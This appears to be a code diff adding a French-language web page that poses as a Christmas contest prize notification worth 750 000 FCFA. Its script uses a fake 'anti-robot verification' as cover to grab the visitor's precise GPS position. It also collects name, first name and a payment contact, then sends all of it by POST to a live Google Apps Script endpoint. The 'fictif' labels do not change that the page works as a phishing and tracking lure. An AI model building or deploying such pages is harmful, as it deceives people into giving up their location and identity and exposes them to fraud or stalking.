@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notification de Gain - Concours Fictif</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Définition d'une police plus moderne et conviviale */
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        /* Custom styles, car Tailwind ne gère pas la géolocalisation ou le stockage de données aussi facilement */
+        #data-form {
+            display: none; /* Masqué par défaut */
+        }
+    </style>
+</head>
+<body class="bg-gray-50 flex justify-center items-center min-h-screen p-4">
+
+<div class="container bg-white p-8 sm:p-12 rounded-xl shadow-2xl max-w-lg w-full border-t-8 border-blue-500">
+    <!-- Section de Notification Initiale -->
+    <div id="initial-notification">
+        <h1 class="text-4xl font-extrabold text-blue-600 mb-4 flex items-center justify-center">
+            <span class="text-5xl mr-3">🎉</span> Félicitations !
+        </h1>
+        <p class="text-gray-600 text-lg mb-8">
+            Vous avez été tiré au sort pour le **Concours de Décembre** de Noel !
+            Votre projet a été sélectionné pour un prix de <strong class="text-green-600 font-bold">750 000 FCFA</strong> (Fictifs).
+        </p>
+
+        <button id="claim-button" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 px-6 rounded-lg text-xl transition duration-300 shadow-md transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-green-300">
+            Réclamer le Prix de 750 000 FCFA
+        </button>
+    </div>
+
+    <!-- Section du Formulaire de Vérification -->
+    <div id="data-form">
+        <h2 class="text-2xl font-semibold text-gray-800 mb-6 border-b pb-2">Vérification et Contact</h2>
+        <p class="text-sm text-gray-500 mb-6">
+            Veuillez entrer vos informations pour la vérification finale et le versement du prix (fictif).
+        </p>
+
+        <!-- Champ Localisation -->
+        <div class="mb-4">
+            <label for="location-input" class="block text-sm font-medium text-gray-700 mb-1">1. Localisation (Vérification anti-robot) :</label>
+            <input type="text" id="location-input" placeholder="Ex: Paris, France" required 
+                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition duration-150">
+        </div>
+
+        <!-- Champ Nom -->
+        <div class="mb-4">
+            <label for="name-input" class="block text-sm font-medium text-gray-700 mb-1">2. Nom :</label>
+            <input type="text" id="name-input" placeholder="Votre Nom" required
+                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition duration-150">
+        </div>
+
+        <!-- Champ Prénom -->
+        <div class="mb-4">
+            <label for="firstname-input" class="block text-sm font-medium text-gray-700 mb-1">3. Prénom :</label>
+            <input type="text" id="firstname-input" placeholder="Votre Prénom" required
+                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition duration-150">
+        </div>
+
+        <!-- Champ Contact -->
+        <div class="mb-6">
+            <label for="contact-input" class="block text-sm font-medium text-gray-700 mb-1">4. Contact (e-mail ou Numéro pour le versement) :</label>
+            <input type="text" id="contact-input" placeholder="Ex: email@exemple.com ou +225..." required
+                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition duration-150">
+        </div>
+
+        <button id="submit-button" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 focus:outline-none focus:ring-4 focus:ring-blue-300">
+            Valider mes Informations
+        </button>
+
+        <div class="success-message mt-6 text-center" id="result-message" style="display: none;">
+            <p class="text-lg text-green-600 font-medium">✅ Informations validées !</p>
+            <p class="text-sm text-gray-500 mt-2">
+                Ouvrez la console de développement (F12) pour voir la variable JavaScript `collectedData`.
+            </p>
+        </div>
+
+        <!-- Message d'erreur pour les champs vides -->
+        <div class="error-message mt-4 text-center text-red-500 font-medium" id="error-message" style="display: none;">
+            Veuillez remplir tous les champs obligatoires.
+        </div>
+    </div>
+
+</div>
+
+<script>
+    function getGPSCoordinates() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject("La géolocalisation n'est pas supportée par ce navigateur.");
+          return;
+        }
+    
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            resolve({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            });
+          },
+          (error) => {
+            reject("Erreur de géolocalisation : " + error.message);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      });
+    }
+    
+    let collectedData = {};
+    
+    const claimButton = document.getElementById('claim-button');
+    const dataForm = document.getElementById('data-form');
+    const submitButton = document.getElementById('submit-button');
+    const initialNotification = document.getElementById('initial-notification');
+    const resultMessage = document.getElementById('result-message');
+    const errorMessage = document.getElementById('error-message');
+    
+    claimButton.addEventListener('click', () => {
+        initialNotification.style.display = 'none';
+        dataForm.style.display = 'block';
+    
+        const locationInput = document.getElementById('location-input');
+        locationInput.value = "Récupération de la localisation...";
+    
+        getGPSCoordinates()
+          .then((coords) => {
+            const lat = coords.latitude.toFixed(6);
+            const lon = coords.longitude.toFixed(6);
+    
+            locationInput.value = `Lat: ${lat}, Lon: ${lon} (±${Math.round(coords.accuracy)}m)`;
+    
+            console.log("📍 Google Maps :", `https://www.google.com/maps?q=${lat},${lon}`);
+          })
+          .catch((err) => {
+            console.error(err);
+            locationInput.value = "Verification Anti robot & Géolocalisation";
+          });
+    });
+    
+    submitButton.addEventListener('click', () => {
+        const location = document.getElementById('location-input').value;
+        const name = document.getElementById('name-input').value;
+        const firstname = document.getElementById('firstname-input').value;
+        const contact = document.getElementById('contact-input').value;
+    
+        errorMessage.style.display = 'none';
+    
+        if (!location || !name || !firstname || !contact || location.includes("Récupération")) {
+            errorMessage.textContent = "Veuillez attendre la fin de la localisation et remplir tous les champs.";
+            errorMessage.style.display = 'block';
+            return;
+        }
+    
+        collectedData = {
+            localisation: location,
+            nom: name,
+            prenom: firstname,
+            contact_paiement: contact,
+            date_saisie: new Date().toLocaleString('fr-FR')
+        };
+    
+        dataForm.style.display = 'none';
+        resultMessage.style.display = 'block';
+    
+        console.log("===================================");
+        console.log("📩 DONNÉES DE FORMULAIRE COLLECTÉES :");
+        console.log(collectedData);
+        console.log("===================================");
+    
+        /* 🚀 ENVOI DANS GOOGLE SHEET */
+        fetch("https://script.google.com/macros/s/AKfycbxm7AQtV5-KsdgyxaXZJ8MGIMZtnXTAZGObMQ5J8WB1c6h-mzRpbRUFSyy0aWRJAMmC/exec", {
+            method: "POST",
+            headers: { 
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(collectedData)
+        })
+        .then(response => response.text())
+        .then(result => {
+            console.log("🟢 Google Sheets a répondu :", result);
+        })
+        .catch(error => {
+            console.error("🔴 Erreur lors de l'envoi au Google Sheet :", error);
+        });
+    });
+    </script>
+    
+
+</body>
+</html>
